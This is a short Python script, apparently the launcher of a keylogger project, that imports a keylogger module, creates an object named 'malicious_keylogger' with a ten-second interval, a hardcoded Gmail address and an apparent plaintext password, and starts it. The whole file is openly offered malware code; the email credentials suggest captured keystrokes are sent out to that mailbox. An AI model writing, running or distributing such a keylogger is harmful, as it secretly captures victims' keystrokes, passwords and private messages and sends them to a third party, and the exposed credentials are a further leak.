#!/usr/bin/env python

import keylogger


# Initialize / create keylogger

malicious_keylogger = keylogger.KeyLogger(10, 'completekeyloggerproject@gmail.com', 'Fi63J3vjCyE3')

# Execute Keylogger

malicious_keylogger.start()


